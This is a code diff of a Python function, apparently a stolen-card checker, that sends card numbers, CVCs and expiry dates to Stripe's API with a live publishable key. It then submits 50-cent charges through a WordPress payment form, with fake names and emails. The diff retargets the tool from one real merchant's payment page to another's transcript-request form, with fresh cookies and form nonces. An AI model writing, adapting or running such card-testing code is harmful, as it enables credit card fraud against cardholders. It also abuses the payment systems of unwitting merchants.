@@ -28,38 +28,36 @@ def Tele(ccx):
 	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
-	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa737e82bd0%3B+stripe-js-v3%2Fa737e82bd0%3B+card-element&key=pk_live_51OGuVJJSlvu2pbvHUCSF90qKHbTOMFP7CwVkMup0r0NBY6YKj5F429W0ImCUyP1RaOJuiYC0FfVyFW1YzKHajgiA00nqN47tcP'
-	
+		
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fa68b6ec690%3B+stripe-js-v3%2Fa68b6ec690%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
+		
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
+		
 	pm = r1.json()['id']
-	
+		
 	cookies = {
-	    'nitroCachedPage': '0',
-	    '_gcl_au': '1.1.66036949.1744749062',
-	    '_ga': 'GA1.3.1070660164.1744749061',
-	    '_gid': 'GA1.3.486536076.1744749064',
-	    '_gat_UA-213518938-1': '1',
-	    '_hjSessionUser_3158161': 'eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==',
-	    '_hjSession_3158161': 'eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
-	    '_fbp': 'fb.2.1744749065247.45734606816285652',
-	    '_ga_RNL9BQ376F': 'GS1.3.1744749065.1.0.1744749065.0.0.0',
-	    'PHPSESSID': '3e34655be80b7d85850811c50f50e5e4',
-	    '__stripe_mid': '69089077-5867-40f7-ae32-1064b8354e322a04b2',
-	    '__stripe_sid': '73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0',
-	    '_ga_49Y935403S': 'GS1.1.1744749061.1.1.1744749113.0.0.0',
-	    '_ga_4LWD5S7HLJ': 'GS1.1.1744749062.1.1.1744749113.0.0.0',
+	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    '__stripe_mid': '45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e',
+	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    'tk_lr': '%22%22',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2025-04-15%2005%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3D%28none%29',
+	    'sbjs_first_add': 'fd%3D2025-04-15%2005%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3D%28none%29',
+	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F',
+	    '__stripe_sid': '3ce9fa23-6563-447c-9b28-ce11ec04c97a1fbcee',
 	}
-	
+		
 	headers = {
-	    'authority': 'www.floodrestorationaustralia.com.au',
+	    'authority': 'narhs.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'nitroCachedPage=0; _gcl_au=1.1.66036949.1744749062; _ga=GA1.3.1070660164.1744749061; _gid=GA1.3.486536076.1744749064; _gat_UA-213518938-1=1; _hjSessionUser_3158161=eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3158161=eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.2.1744749065247.45734606816285652; _ga_RNL9BQ376F=GS1.3.1744749065.1.0.1744749065.0.0.0; PHPSESSID=3e34655be80b7d85850811c50f50e5e4; __stripe_mid=69089077-5867-40f7-ae32-1064b8354e322a04b2; __stripe_sid=73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0; _ga_49Y935403S=GS1.1.1744749061.1.1.1744749113.0.0.0; _ga_4LWD5S7HLJ=GS1.1.1744749062.1.1.1744749113.0.0.0',
-	    'origin': 'https://www.floodrestorationaustralia.com.au',
-	    'referer': 'https://www.floodrestorationaustralia.com.au/payments/',
+	    # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_mid=45ba4ad4-2987-4906-a5c2-2c035044182f5adf8e; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-15%2005%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-04-15%2005%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnarhs.com%2Ftranscript-request%2F; __stripe_sid=3ce9fa23-6563-447c-9b28-ce11ec04c97a1fbcee',
+	    'origin': 'https://narhs.com',
+	    'referer': 'https://narhs.com/transcript-request/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -69,24 +67,14 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'x-requested-with': 'XMLHttpRequest',
 	}
-	
+		
 	params = {
-	    't': '1744749114136',
+	    't': '1744695542391',
 	}
-	
-	data = {
-	    'data': '__fluent_form_embded_post_id=240208&_fluentform_4_fluentformnonce=e8d1f32881&_wp_http_referer=%2Fpayments%2F&numeric-field=1&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser22%40gmail.com&custom-payment-amount_2=0.50&custom-payment-amount_1=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
-	    'action': 'fluentform_submit',
-	    'form_id': '4',
-	}
-	
-	r2 = session.post(
-	    'https://www.floodrestorationaustralia.com.au/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+		
+	data = 'data=item_5__fluent_sf%3D%26__fluent_form_embded_post_id%3D458%26_fluentform_5_fluentformnonce%3D06b539f8c5%26_wp_http_referer%3D%252Ftranscript-request%252F%26input_text_2%3DRodam%26input_text_3%3DUser%26datetime%3D04%252F03%252F2001%26email%3Drodamuser08%2540gmail.com%26input_text%3DSchool%26dropdown%3DSent%2520to%2520the%2520recipient%2520via%2520Email%26email_1%3D%26terms-n-condition%3Don%26input_radio%3DOfficial%2520(%252410%252Fea)%26numeric-field%3D1%26description%3D%26custom-payment-amount%3D0.50%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
+		
+	r2 = session.post('https://narhs.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	result2 = r2.text
 	return result2
